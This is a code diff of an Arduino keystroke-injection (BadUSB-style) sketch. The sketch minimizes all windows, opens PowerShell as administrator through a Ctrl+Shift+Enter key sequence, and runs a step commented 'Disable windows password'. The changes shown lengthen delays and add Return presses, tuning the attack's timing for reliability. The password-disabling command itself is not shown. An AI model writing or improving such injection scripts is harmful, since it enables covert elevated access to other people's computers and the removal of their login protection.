@@ -13,13 +13,15 @@ void setup()
   
   Keyboard.begin();
 
-  delay(500);
+  delay(2500);
   
   // Minimize all apps
 
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('d');
   Keyboard.releaseAll();
+
+  delay(500);
 
   // Start powershell as admin
 
@@ -31,7 +33,7 @@ void setup()
 
   Keyboard.print("powershell");
 
-  delay(150);
+  delay(200);
 
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press(KEY_LEFT_SHIFT);
@@ -47,7 +49,7 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  delay(500);
+  delay(2000);
   
   // Disable windows password
 
@@ -56,6 +58,14 @@ void setup()
   typeKey(KEY_RETURN);
 
   delay(150);
+
+  typeKey(KEY_RETURN);
+
+  delay(150);
+
+  typeKey(KEY_RETURN);
+
+  delay(200);
 
   Keyboard.print("exit");
 
